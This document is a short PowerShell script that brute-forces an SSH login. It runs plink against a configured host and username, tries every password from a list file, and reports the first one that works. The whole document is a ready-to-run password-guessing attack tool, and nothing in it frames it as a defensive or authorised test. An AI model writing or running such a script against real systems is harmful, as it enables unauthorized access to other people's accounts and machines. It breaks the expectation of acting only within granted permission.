# Requires Putty/Plink to be present
# Define SSH parameters
$sshHost = "192.168.0.1"   # Replace with your SSH server IP/hostname
$sshUser = "admin"         # Replace with your SSH username
$passwordFile = "C:\path-to\passwords.txt"  # Path to password list file

# Check if password file exists
if (!(Test-Path $passwordFile)) {
    Write-Host "Password file not found: $passwordFile"
    exit 1
}

# Read passwords from file
$passwords = Get-Content $passwordFile

# Iterate over each password
foreach ($password in $passwords) {
    Write-Host "Trying password: $password"

    # Execute SSH login attempt using plink
    $output = & plink -ssh -l $sshUser -pw $password -batch $sshHost "echo success" 2>&1

    # Check if authentication was successful
    if ($output -match "success") {
        Write-Host "Valid password found: $password"
        exit 0
    }
}

Write-Host "No valid password found."
exit 1
